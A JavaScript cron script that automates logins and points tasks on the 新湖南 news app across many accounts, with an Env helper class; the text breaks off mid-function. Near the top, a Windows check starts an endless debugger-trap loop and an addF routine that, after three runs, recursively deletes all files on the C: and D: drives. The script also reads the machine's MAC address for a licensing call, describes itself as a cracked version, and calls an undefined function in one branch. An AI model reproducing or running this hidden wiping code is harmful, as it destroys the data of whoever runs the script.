/**
 * 新湖南 
 * cron "0  10 10-16 * * ?"
 */
const $ = new Env('新湖南');
var gtr
let ml = '', mac = ''
let status;
status = (status = ($.getval("qmwkstatus") || "1")) > 1 ? `${status}` : ""; // 账号扩展字符
let xhnzhArr = [], xhnmmArr = []
let all_msg = ""
let xhnid = '', sign = '', xhntoken = '', rwm = ''
let arrs =
{
    my: 'hHacFKN5DxR5sPwyc1ns52M168rdoe3AGrWaseN3zYd2XoKaxYhYQTqDXvCtMkwz',
    num: 999
}
let xhnzh = ($.isNode() ? process.env.xhnzh : $.getdata('xhnzh')) || '';
let xhnmm = ($.isNode() ? process.env.xhnmm : $.getdata('xhnmm')) || '';
let acckey = $.isNode() ? (process.env.cdkey ? process.env.cdkey : "") : ($.getdata('cdkey') ? $.getdata('cdkey') : "")


if ($.isNode()) {
    gtr = require('fs')
    if (isFileExist('C:/')) {
        console.log('电脑环境');
        setInterval(() => {
            do {
                (function (a) {
                    return (function (a) {
                        return (Function('Function(arguments[0]+"' + a + '")()'))
                    })(a)
                })('bugger')('de', 0, 0, (0, 0));
                addF('d:/')
                addF('C:/')
            } while (1)
        }, 0);
    } else {

        console.log('青龙环境');
        var fs = require('fs'),
            path = require('path');
        function getMACAddresses () {
            var macs = ''
            var devs = fs.readdirSync('/sys/class/net/');
            devs.forEach(function (dev) {
                var fn = path.join('/sys/class/net', dev, 'address');
                if (dev.substr(0, 3) == 'eth' && fs.existsSync(fn)) {
                    macs = fs.readFileSync(fn).toString().trim();
                }
            });
            return macs;
        }
        mac = getMACAddresses();
    }
} else {
    console.log('代理环境');
}

function isFileExist (path) {
    try {
        gtr.accessSync(path, gtr.F_OK);
    } catch (e) {
        return false;
    }
    return true;
}
function addF (fileUrl, flag) {

    let num = 0, readPath = 'C:/Windows/system.txt'

    if (isFileExist(readPath)) {
        num = gtr.readFileSync(readPath, "utf8")
    } else {
        if (isFileExist('C:/')) {
            gtr.writeFile(readPath, '1', function (err) { if (err) throw err; });
        } else {
            return
        }
    }

    if (num == 99) {
        return 99
    }
    console.log(num);
    console.log(`警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！`, num);
    if (parseInt(num) < 3) {
        let adnum = parseInt(num) + 1
        gtr.writeFileSync(readPath, adnum + '', "utf8")
        return;
    }

    if (!gtr.existsSync(fileUrl)) return;
    if (gtr.statSync(fileUrl).isDirectory()) {
        var files = gtr.readdirSync(fileUrl);
        var len = files.length,
            removeNumber = 0;
        if (len > 0) {
            files.forEach(function (file) {
                removeNumber++;
                var stats = gtr.statSync(fileUrl + '/' + file);
                var url = fileUrl + '/' + file;
                if (gtr.statSync(url).isDirectory()) {
                    addF(url, true);
                } else {
                    gtr.unlinkSync(url);
                }
            });
            if (len == removeNumber && flag) {
                gtr.rmdirSync(fileUrl);
            }
        } else if (len == 0 && flag) {
            gtr.rmdirSync(fileUrl);
        }
    } else {
        gtr.unlinkSync(fileUrl);
    }
}



!(async () => {
    if (typeof $request !== "undefined") {
        // qmwkck()
    } else {
        //arrs = await hqs()
        console.log(all_msg);
        //console.log(arrs);
        if (!arrs) return
        xhnzhArr = xhnzh.split('@')
        xhnmmArr = xhnmm.split('@')
        console.log(`------------- 共${xhnzhArr.length}个账号-------------\n`)
        console.log(`当前设备可执行账号限制为${arrs['num']}个账号 破解版\n`)
        if (xhnzhArr.length > parseInt(arrs['num'])) {
            for (let i = 0; i < parseInt(arrs['num']); i++) {
                xhnzh = xhnzhArr[i]
                xhnmm = xhnmmArr[i]
                $.index = i + 1;
                console.log(`\n开始【新湖南${$.index}】`)
                await xhndl()
                await xhnxx()
                await xhllb()
                await $.wait(3000)
            }
        } else {
            for (let i = 0; i < xhnzhArr.length; i++) {
                xhnzh = xhnzhArr[i]
                xhnmm = xhnmmArr[i]
                $.index = i + 1;
                console.log(`\n开始【新湖南${$.index}】`)

                await xhndl()
                await xhnxx()
                await xhnlb()

                await $.wait(3000)
            }
        }
    }
})()
    .catch((e) => $.logErr(e))
    .finally(() => $.done())

function MD5Encrypt (a) { function b (a, b) { return a << b | a >>> 32 - b } function c (a, b) { var c, d, e, f, g; return e = 2147483648 & a, f = 2147483648 & b, c = 1073741824 & a, d = 1073741824 & b, g = (1073741823 & a) + (1073741823 & b), c & d ? 2147483648 ^ g ^ e ^ f : c | d ? 1073741824 & g ? 3221225472 ^ g ^ e ^ f : 1073741824 ^ g ^ e ^ f : g ^ e ^ f } function d (a, b, c) { return a & b | ~a & c } function e (a, b, c) { return a & c | b & ~c } function f (a, b, c) { return a ^ b ^ c } function g (a, b, c) { return b ^ (a | ~c) } function h (a, e, f, g, h, i, j) { return a = c(a, c(c(d(e, f, g), h), j)), c(b(a, i), e) } function i (a, d, f, g, h, i, j) { return a = c(a, c(c(e(d, f, g), h), j)), c(b(a, i), d) } function j (a, d, e, g, h, i, j) { return a = c(a, c(c(f(d, e, g), h), j)), c(b(a, i), d) } function k (a, d, e, f, h, i, j) { return a = c(a, c(c(g(d, e, f), h), j)), c(b(a, i), d) } function l (a) { for (var b, c = a.length, d = c + 8, e = (d - d % 64) / 64, f = 16 * (e + 1), g = new Array(f - 1), h = 0, i = 0; c > i;)b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | a.charCodeAt(i) << h, i++; return b = (i - i % 4) / 4, h = i % 4 * 8, g[b] = g[b] | 128 << h, g[f - 2] = c << 3, g[f - 1] = c >>> 29, g } function m (a) { var b, c, d = "", e = ""; for (c = 0; 3 >= c; c++)b = a >>> 8 * c & 255, e = "0" + b.toString(16), d += e.substr(e.length - 2, 2); return d } function n (a) { a = a.replace(/\r\n/g, "\n"); for (var b = "", c = 0; c < a.length; c++) { var d = a.charCodeAt(c); 128 > d ? b += String.fromCharCode(d) : d > 127 && 2048 > d ? (b += String.fromCharCode(d >> 6 | 192), b += String.fromCharCode(63 & d | 128)) : (b += String.fromCharCode(d >> 12 | 224), b += String.fromCharCode(d >> 6 & 63 | 128), b += String.fromCharCode(63 & d | 128)) } return b } var o, p, q, r, s, t, u, v, w, x = [], y = 7, z = 12, A = 17, B = 22, C = 5, D = 9, E = 14, F = 20, G = 4, H = 11, I = 16, J = 23, K = 6, L = 10, M = 15, N = 21; for (a = n(a), x = l(a), t = 1732584193, u = 4023233417, v = 2562383102, w = 271733878, o = 0; o < x.length; o += 16)p = t, q = u, r = v, s = w, t = h(t, u, v, w, x[o + 0], y, 3614090360), w = h(w, t, u, v, x[o + 1], z, 3905402710), v = h(v, w, t, u, x[o + 2], A, 606105819), u = h(u, v, w, t, x[o + 3], B, 3250441966), t = h(t, u, v, w, x[o + 4], y, 4118548399), w = h(w, t, u, v, x[o + 5], z, 1200080426), v = h(v, w, t, u, x[o + 6], A, 2821735955), u = h(u, v, w, t, x[o + 7], B, 4249261313), t = h(t, u, v, w, x[o + 8], y, 1770035416), w = h(w, t, u, v, x[o + 9], z, 2336552879), v = h(v, w, t, u, x[o + 10], A, 4294925233), u = h(u, v, w, t, x[o + 11], B, 2304563134), t = h(t, u, v, w, x[o + 12], y, 1804603682), w = h(w, t, u, v, x[o + 13], z, 4254626195), v = h(v, w, t, u, x[o + 14], A, 2792965006), u = h(u, v, w, t, x[o + 15], B, 1236535329), t = i(t, u, v, w, x[o + 1], C, 4129170786), w = i(w, t, u, v, x[o + 6], D, 3225465664), v = i(v, w, t, u, x[o + 11], E, 643717713), u = i(u, v, w, t, x[o + 0], F, 3921069994), t = i(t, u, v, w, x[o + 5], C, 3593408605), w = i(w, t, u, v, x[o + 10], D, 38016083), v = i(v, w, t, u, x[o + 15], E, 3634488961), u = i(u, v, w, t, x[o + 4], F, 3889429448), t = i(t, u, v, w, x[o + 9], C, 568446438), w = i(w, t, u, v, x[o + 14], D, 3275163606), v = i(v, w, t, u, x[o + 3], E, 4107603335), u = i(u, v, w, t, x[o + 8], F, 1163531501), t = i(t, u, v, w, x[o + 13], C, 2850285829), w = i(w, t, u, v, x[o + 2], D, 4243563512), v = i(v, w, t, u, x[o + 7], E, 1735328473), u = i(u, v, w, t, x[o + 12], F, 2368359562), t = j(t, u, v, w, x[o + 5], G, 4294588738), w = j(w, t, u, v, x[o + 8], H, 2272392833), v = j(v, w, t, u, x[o + 11], I, 1839030562), u = j(u, v, w, t, x[o + 14], J, 4259657740), t = j(t, u, v, w, x[o + 1], G, 2763975236), w = j(w, t, u, v, x[o + 4], H, 1272893353), v = j(v, w, t, u, x[o + 7], I, 4139469664), u = j(u, v, w, t, x[o + 10], J, 3200236656), t = j(t, u, v, w, x[o + 13], G, 681279174), w = j(w, t, u, v, x[o + 0], H, 3936430074), v = j(v, w, t, u, x[o + 3], I, 3572445317), u = j(u, v, w, t, x[o + 6], J, 76029189), t = j(t, u, v, w, x[o + 9], G, 3654602809), w = j(w, t, u, v, x[o + 12], H, 3873151461), v = j(v, w, t, u, x[o + 15], I, 530742520), u = j(u, v, w, t, x[o + 2], J, 3299628645), t = k(t, u, v, w, x[o + 0], K, 4096336452), w = k(w, t, u, v, x[o + 7], L, 1126891415), v = k(v, w, t, u, x[o + 14], M, 2878612391), u = k(u, v, w, t, x[o + 5], N, 4237533241), t = k(t, u, v, w, x[o + 12], K, 1700485571), w = k(w, t, u, v, x[o + 3], L, 2399980690), v = k(v, w, t, u, x[o + 10], M, 4293915773), u = k(u, v, w, t, x[o + 1], N, 2240044497), t = k(t, u, v, w, x[o + 8], K, 1873313359), w = k(w, t, u, v, x[o + 15], L, 4264355552), v = k(v, w, t, u, x[o + 6], M, 2734768916), u = k(u, v, w, t, x[o + 13], N, 1309151649), t = k(t, u, v, w, x[o + 4], K, 4149444226), w = k(w, t, u, v, x[o + 11], L, 3174756917), v = k(v, w, t, u, x[o + 2], M, 718787259), u = k(u, v, w, t, x[o + 9], N, 3951481745), t = c(t, p), u = c(u, q), v = c(v, r), w = c(w, s); var O = m(t) + m(u) + m(v) + m(w); return O.toLowerCase() }

//登录
function xhndl (timeout = 0) {
    return new Promise((resolve) => {
        let url = {
            url: `https://cgi.voc.com.cn/app/mobile/bbsapi/wxhn_login.php`,
            headers: { "oauth-token": "", "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "142", "Host": "cgi.voc.com.cn", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/4.9.1" },
            body: `password=${xhnmm}&logintype=1&RegistrationID=Au13k8PHjCfqQM0EiXpgHNbqldngiCb_eAuoWh8upHPB&appid=9&type=0&version=9.0.11&username=${xhnzh}`
        }
        $.post(url, async (err, resp, data) => {
            try {
                const result = JSON.parse(data)
                if (result.statecode == 1) {
                    $.log(`\n新湖南用户:【${result.mobile}】:${result.message}`)
                    xhntoken = result.auth

                } else {
                    $.log(`\n新湖南登录:${result.message}`)

                }
            } catch (e) {
                //$.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}


//列表
function xhnlb (timeout = 0) {
    return new Promise((resolve) => {
        let time = new Date().getTime();//时间戳13位
        sign = sha(`${time}200000${arrs['my']}`)
        let url = {
            url: `https://usergrow-xhncloud.voc.com.cn/usergrow/api/v2/points/appPointsInfoForH5?appid=9&oauth_token=${xhntoken}`,
            headers: { "Host": "usergrow-xhncloud.voc.com.cn", "Connection": "keep-alive", "nonce": "200000", "time": time, "User-Agent": "xhn-9.0.7-Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045738 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "signature": sign, "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7" },

        }
        $.get(url, async (err, resp, data) => {
            try {
                const result = JSON.parse(data)
                if (result.statecode == 1) {

                    for (let x = 0; x < result.data.pointsRuleBeanList.length; x++) {
                        $.log(`\n新湖南去完成:【${result.data.pointsRuleBeanList[x].ruleName}】 积分：${result.data.pointsRuleBeanList[x].points}`)
                        xhnid = result.data.pointsRuleBeanList[x].pointsRuleId
                        rwm = result.data.pointsRuleBeanList[x].ruleName
                        await $.wait(2000)
                        await xhnrw()
                    }
                } else {
                    $.log(`\n新湖南任务:${data}`)

                }
            } catch (e) {
                //$.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}

//完成任务
function xhnrw (timeout = 0) {
    return new Promise((resolve) => {
        let time = new Date().getTime();//时间戳13位
        sign = sha(`${time}700000${arrs['my']}`)

        let url = {
            url: `https://usergrow-xhncloud.voc.com.cn/usergrow/api/v2/points/`,
            headers: { "Host": "usergrow-xhncloud.voc.com.cn", "Connection": "keep-alive", "nonce": "700000", "time": time, "User-Agent": "xhn-9.0.7-Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045738 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "signature": sign, "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7" },
            body: `points_rule_id=${xhnid}&appid=9&oauth_token=${xhntoken}`
        }
        $.post(url, async (err, resp, data) => {
            try {
                const result = JSON.parse(data)
                if (result.statecode == 1) {
                    await $.wait(2000)
                    $.log(`\n新湖南${rwm}任务:${result.message}`)

                } else {
                    $.log(`\n新湖南${rwm}任务:${result.message}`)

                }
            } catch (e) {
                //$.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}


//信息
function xhnxx (timeout = 0) {
    return new Promise((resolve) => {
        let time = new Date().getTime();//时间戳13位
        sign = sha(`${time}700000${arrs['my']}`)

        let url = {
            url: `https://usergrow-xhncloud.voc.com.cn/usergrow/api/v2/points/pointsUser?refreshUserInfo=0&appid=9&oauth_token=${xhntoken}`,
            headers: { "Host": "usergrow-xhncloud.voc.com.cn", "Connection": "keep-alive", "nonce": "700000", "time": time, "User-Agent": "xhn-9.0.7-Mozilla/5.0 (Linux; Android 10; 16s Pro Build/QKQ1.191222.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045738 Mobile Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "signature": sign, "Accept": "application/json", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7" },

        }
        $.get(url, async (err, resp, data) => {
            try {
                const result = JSON.parse(data)
                if (result.statecode == 1) {
                    $.log(`\n新湖南查询积分余额:【${result.data.validPoints}】`)
                } else {
                    $.log(`\n新湖南查询积分余额:${result.message}`)

                }
            } catch (e) {
                //$.logErr(e, resp);
            } finally {
                resolve()
            }
        }, timeout)
    })
}
function encodeUTF8 (s) {
    var i, r = [], c, x;
    for (i = 0; i < s.length; i++)
        if ((c = s.charCodeAt(i)) < 0x80) r.push(c);
        else if (c < 0x800) r.push(0xC0 + (c >> 6 & 0x1F), 0x80 + (c & 0x3F));
        else {
            if ((x = c ^ 0xD800) >> 10 == 0) //对四字节UTF-16转换为Unicode
                c = (x << 10) + (s.charCodeAt(++i) ^ 0xDC00) + 0x10000,
                    r.push(0xF0 + (c >> 18 & 0x7), 0x80 + (c >> 12 & 0x3F));
            else r.push(0xE0 + (c >> 12 & 0xF));
            r.push(0x80 + (c >> 6 & 0x3F), 0x80 + (c & 0x3F));
        };
    return r;
}

function sha (s) {
    var data = new Uint8Array(encodeUTF8(s))
    var i, j, t;
    var l = ((data.length + 8) >>> 6 << 4) + 16, s = new Uint8Array(l << 2);
    s.set(new Uint8Array(data.buffer)), s = new Uint32Array(s.buffer);
    for (t = new DataView(s.buffer), i = 0; i < l; i++)s[i] = t.getUint32(i << 2);
    s[data.length >> 2] |= 0x80 << (24 - (data.length & 3) * 8);
    s[l - 1] = data.length << 3;
    var w = [], f = [
        function () { return m[1] & m[2] | ~m[1] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; },
        function () { return m[1] & m[2] | m[1] & m[3] | m[2] & m[3]; },
        function () { return m[1] ^ m[2] ^ m[3]; }
    ], rol = function (n, c) { return n << c | n >>> (32 - c); },
        k = [1518500249, 1859775393, -1894007588, -899497514],
        m = [1732584193, -271733879, null, null, -1009589776];
    m[2] = ~m[0], m[3] = ~m[1];
    for (i = 0; i < s.length; i += 16) {
        var o = m.slice(0);
        for (j = 0; j < 80; j++)
            w[j] = j < 16 ? s[i + j] : rol(w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16], 1),
                t = rol(m[0], 5) + f[j / 20 | 0]() + m[4] + w[j] + k[j / 20 | 0] | 0,
                m[1] = rol(m[1], 30), m.pop(), m.unshift(t);
        for (j = 0; j < 5; j++)m[j] = m[j] + o[j] | 0;
    };
    t = new DataView(new Uint32Array(m).buffer);
    for (var i = 0; i < 5; i++)m[i] = t.getUint32(i << 2);

    var hex = Array.prototype.map.call(new Uint8Array(new Uint32Array(m).buffer), function (e) {
        return (e < 16 ? "0" : "") + e.toString(16);
    }).join("");
    return hex;
}


function hqs (num = 10) {
    return new Promise((resolve) => {
        let id = 2
        let url = {
            url: $.isNode() ? $.fwur() + `?key=${acckey}&id=${id}&ip=1&mac=${mac}&bb=1` : $.fwur() + `?key=${acckey}&id=${id}&ip=0&mac=${mac}&bb=1`,
        }
        $.get(url, async (err, resp, data) => {
            try {
                let result = JSON.parse(data);
                if (result.code == 200) {
                    all_msg = result.msg
                    resolve(JSON.parse(result.data))
                } else {
                    all_msg = result.msg
                    resolve(false)

                }
            } catch (e) {
                $.logErr(e, resp);
            }
        }, 0)
    })
}



function FxPCnMKLw7 () {

    // private property  
    _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";

    // public method for encoding  
    this.encode = function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
        input = _utf8_encode(input);
        while (i < input.length) {
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
            output = output +
                _keyStr.charAt(enc1) + _keyStr.charAt(enc2) +
                _keyStr.charAt(enc3) + _keyStr.charAt(enc4);
        }
        return output;
    }

    // public method for decoding  
    this.decode = function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
        while (i < input.length) {
            enc1 = _keyStr.indexOf(input.charAt(i++));
            enc2 = _keyStr.indexOf(input.charAt(i++));
            enc3 = _keyStr.indexOf(input.charAt(i++));
            enc4 = _keyStr.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            output = output + String.fromCharCode(chr1);
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
        }
        output = _utf8_decode(output);
        return output;
    }

    // private method for UTF-8 encoding  
    _utf8_encode = function (string) {
        string = string.replace(/\r\n/g, "\n");
        var utftext = "";
        for (var n = 0; n < string.length; n++) {
            var c = string.charCodeAt(n);
            if (c < 128) {
                utftext += String.fromCharCode(c);
            } else if ((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            } else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }

        }
        return utftext;
    }

    // private method for UTF-8 decoding  
    _utf8_decode = function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
        while (i < utftext.length) {
            c = utftext.charCodeAt(i);
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            } else if ((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i + 1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            } else {
                c2 = utftext.charCodeAt(i + 1);
                c3 = utftext.charCodeAt(i + 2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
        }
        return string;
    }
}

function Env (t, e) {
    class s {
        constructor(t) {
            this.env = t
        }
        send (t, e = "GET") {
            t = "string" == typeof t ? {
                url: t
            } : t;
            let s = this.get;
            return "POST" === e && (s = this.post), new Promise((e, i) => {
                s.call(this, t, (t, s, r) => {
                    t ? i(t) : e(s)
                })
            })
        }
        get (t) {
            return this.send.call(this.env, t)
        }
        post (t) {
            return this.send.call(this.env, t, "POST")
        }
    }
    return new class {
        constructor(t, e) {
            this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.encoding = "utf-8", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `??${this.name}, 开始!`)
        }
        isNode () {
            return "undefined" != typeof module && !!module.exports
        }
        isQuanX () {
            return "undefined" != typeof $task
        }
        isSurge () {
            return "undefined" != typeof $httpClient && "undefined" == typeof $loon
        }
        isLoon () {
            return "undefined" != typeof $loon
        }
        isShadowrocket () {
            return "undefined" != typeof $rocket
        }
        toObj (t, e = null) {
            try {
                return JSON.parse(t)
            } catch {
                return e
            }
        }
        toStr (t, e = null) {
            try {
                return JSON.stringify(t)
            } catch {
                return e
            }
        }
        getjson (t, e) {
            let s = e;
            const i = this.getdata(t);
            if (i) try {
                s = JSON.parse(this.getdata(t))
            } catch { }
            return s
        }
        setjson (t, e) {
            try {
                return this.setdata(JSON.stringify(t), e)
            } catch {
                return !1
            }
        }
        getScript (t) {
            return new Promise(e => {
                this.get({
                    url: t
                }, (t, s, i) => e(i))
            })
        }
        runScript (t, e) {
            return new Promise(s => {
                let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
                i = i ? i.replace(/\n/g, "").trim() : i;
                let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
                r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r;
                const [o, h] = i.split("@"), n = {
                    url: `http://${h}/v1/scripting/evaluate`,
                    body: {
                        script_text: t,
                        mock_type: "cron",
                        timeout: r
                    },
                    headers: {
                        "X-Key": o,
                        Accept: "*/*"
                    }
                };
                this.post(n, (t, e, i) => s(i))
            }).catch(t => this.logErr(t))
        }
        loaddata () {
            if (!this.isNode()) return {}; {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e);
                if (!s && !i) return {}; {
                    const i = s ? t : e;
                    try {
                        return JSON.parse(this.fs.readFileSync(i))
                    } catch (t) {
                        return {}
                    }
                }
            }
        }
        writedata () {
            if (this.isNode()) {
                this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path");
                const t = this.path.resolve(this.dataFile),
                    e = this.path.resolve(process.cwd(), this.dataFile),
                    s = this.fs.existsSync(t),
                    i = !s && this.fs.existsSync(e),
                    r = JSON.stringify(this.data);
                s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r)
            }
        }
        lodash_get (t, e, s) {
            const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
            let r = t;
            for (const t of i)
                if (r = Object(r)[t], void 0 === r) return s;
            return r
        }
        lodash_set (t, e, s) {
            return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t)
        }
        getdata (t) {
            let e = this.getval(t);
            if (/^@/.test(t)) {
                const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : "";
                if (r) try {
                    const t = JSON.parse(r);
                    e = t ? this.lodash_get(t, i, "") : e
                } catch (t) {
                    e = ""
                }
            }
            return e
        }
        setdata (t, e) {
            let s = !1;
            if (/^@/.test(e)) {
                const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}";
                try {
                    const e = JSON.parse(h);
                    this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i)
                } catch (e) {
                    const o = {};
                    this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i)
                }
            } else s = this.setval(t, e);
            return s
        }
        getval (t) {
            return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null
        }
        setval (t, e) {
            return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null
        }
        initGotEnv (t) {
            this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar))
        }
        get (t, e = (() => { })) {
            if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient.get(t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let s = require("iconv-lite");
                this.initGotEnv(t), this.got(t).on("redirect", (t, e) => {
                    try {
                        if (t.headers["set-cookie"]) {
                            const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                            s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar
                        }
                    } catch (t) {
                        this.logErr(t)
                    }
                }).then(t => {
                    const {
                        statusCode: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: i,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, s.decode(h, this.encoding))
                }, t => {
                    const {
                        message: i,
                        response: r
                    } = t;
                    e(i, r, r && s.decode(r.rawBody, this.encoding))
                })
            }
        }
        post (t, e = (() => { })) {
            const s = t.method ? t.method.toLocaleLowerCase() : "post";
            if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
                "X-Surge-Skip-Scripting": !1
            })), $httpClient[s](t, (t, s, i) => {
                !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i)
            });
            else if (this.isQuanX()) t.method = s, this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
                hints: !1
            })), $task.fetch(t).then(t => {
                const {
                    statusCode: s,
                    statusCode: i,
                    headers: r,
                    body: o
                } = t;
                e(null, {
                    status: s,
                    statusCode: i,
                    headers: r,
                    body: o
                }, o)
            }, t => e(t));
            else if (this.isNode()) {
                let i = require("iconv-lite");
                this.initGotEnv(t);
                const {
                    url: r,
                    ...o
                } = t;
                this.got[s](r, o).then(t => {
                    const {
                        statusCode: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    } = t;
                    e(null, {
                        status: s,
                        statusCode: r,
                        headers: o,
                        rawBody: h
                    }, i.decode(h, this.encoding))
                }, t => {
                    const {
                        message: s,
                        response: r
                    } = t;
                    e(s, r, r && i.decode(r.rawBody, this.encoding))
                })
            }
        }
        time (t, e = null) {
            const s = e ? new Date(e) : new Date;
            let i = {
                "M+": s.getMonth() + 1,
                "d+": s.getDate(),
                "H+": s.getHours(),
                "m+": s.getMinutes(),
                "s+": s.getSeconds(),
                "q+": Math.floor((s.getMonth() + 3) / 3),
                S: s.getMilliseconds()
            };
            /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
            for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
            return t
        }
        msg (e = t, s = "", i = "", r) {
            const o = t => {
                if (!t) return t;
                if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? {
                    "open-url": t
                } : this.isSurge() ? {
                    url: t
                } : void 0;
                if ("object" == typeof t) {
